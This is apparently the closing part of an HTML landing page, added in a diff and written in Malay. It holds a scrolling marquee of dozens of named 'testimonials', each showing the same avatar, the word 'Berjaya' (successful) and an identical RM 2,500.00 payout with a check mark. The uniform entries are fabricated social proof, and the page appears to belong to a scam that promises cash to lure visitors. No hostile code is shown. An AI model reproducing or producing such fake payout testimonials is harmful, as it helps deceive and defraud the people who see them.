+				<div> <span class="name">Rina Rosli</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Yusri Kamal</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Noraini Abdul</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Siti Amirah</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Eka Johari</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Kamal Arif</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Sufian Sharif</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Fizah Haris</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Adlina Rahim</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Haziq Farhan</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Mia Syahira</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Samiha Yusof</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Yusuf Ibrahim</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Sharina Salleh</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Anwar Faiz</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Wani Zainab</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Aiman Zulkifli</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Rani Hassan</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Fahmi Salleh</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Muna Arifin</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Lina Zulfiqar</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Fakhira Hisham</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Yassir Khair</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Sulaiman Rahman</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Hanis Zainal</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Faiz Rosli</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Junaidah Omar</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Zulaikha Mohd</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Nashitah Hidayah</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Haris Zubair</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Mardhiah Ashraf</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Najwa Zaki</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Rohaya Taufik</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Mizan Mat</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Rashid Ismail</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Khalil Jamil</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Amira Kamal</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Daniella Fikri</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Siti Hawa</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Nabilah Farid</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Mohd Rafiq</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Naim Aidan</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Shamsul Arifin</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Aisyah Sofia</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Laili Junaid</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Hafiz Zulkifli</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Azlan Mohamad</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Norfaizah Noor</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Kahfi Rahman</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Shahirah Zain</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Siti Hanisah</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Fahim Ismail</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Eka Kamal</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Madiha Roslan</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Ruqayyah Alif</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Hikmatullah Hassan</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Lina Hafizah</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Sakinah Yusri</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Shahril Kamal</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Dahlia Nordin</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Muhammad Taufik</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Norashikin Halim</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Azfar Johan</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Aminah Hafiz</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Rafiq Razak</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Zulkarnain Ibrahim</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+		</marquee>
+	</div>
+	</div>
+	<div style="width: 100%;padding: 0px 16px;max-width: 500px;margin: auto;"> <img class="w-100 mb-3" src="assets/ini1.jpg"> </div>
+	
+	</div>
+</body>
+
+</html>
